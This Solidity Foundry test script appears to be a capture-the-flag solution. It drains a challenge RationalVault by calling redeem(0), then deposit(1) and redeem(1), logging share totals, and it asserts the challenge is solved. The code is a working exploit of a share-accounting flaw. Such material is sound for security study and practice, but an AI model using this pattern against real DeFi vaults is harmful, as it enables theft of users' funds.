// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Setup} from "src/Setup.sol";
import {RationalVault} from "src/Vault.sol";
import {GREY} from "src/lib/GREY.sol";
import {Rational, RationalLib} from "src/lib/Rational.sol";
import {console} from "forge-std/console.sol";
import {Test} from "forge-std/Test.sol";

contract Exploit is Test {
    address DEPLOYER = makeAddr("Alice");
    address PLAYER = makeAddr("Bob");
    uint256 constant STARTING_BALANCE = 10 ether;

    Setup setup;
    RationalVault vault;
    GREY grey;
    
    function setUp() external {
        setup = new Setup();
        vault = RationalVault(setup.vault());
        grey = GREY(setup.grey());
        vm.deal(DEPLOYER, STARTING_BALANCE);
        vm.deal(PLAYER, STARTING_BALANCE);
    }

    function testExploit() external {
        vm.startPrank(PLAYER);

        setup.claim();
        // // Approve the vault to spend your GREY
        grey.approve(address(vault), 1000e18);


        console.log("");
        
        console.log("===============Before redeem(0)================");
        console.log("totalShares in bytes32");
        console.logBytes32(bytes32(Rational.unwrap(vault.totalShares())));

        console.log("");
        console.log("===============After redeem(0)================");
        vault.redeem(0);
        console.log("totalShares in bytes32");
        console.logBytes32(bytes32(Rational.unwrap(vault.totalShares())));

        console.log("");
        console.log("===============After deposit(1)================");
        vault.deposit(1);
        console.log("GREY balance of player:", grey.balanceOf(PLAYER));

        console.log("Check totalShares in bytes32 after deposit(1)");
        console.logBytes32(bytes32(Rational.unwrap(vault.totalShares())));
        
        console.log("");
        console.log("===============After redeem(1)================");
        vault.redeem(1);

        console.log("GREY balance of player:", grey.balanceOf(PLAYER));
        assertTrue(setup.isSolved());

        vm.stopPrank();
    }
}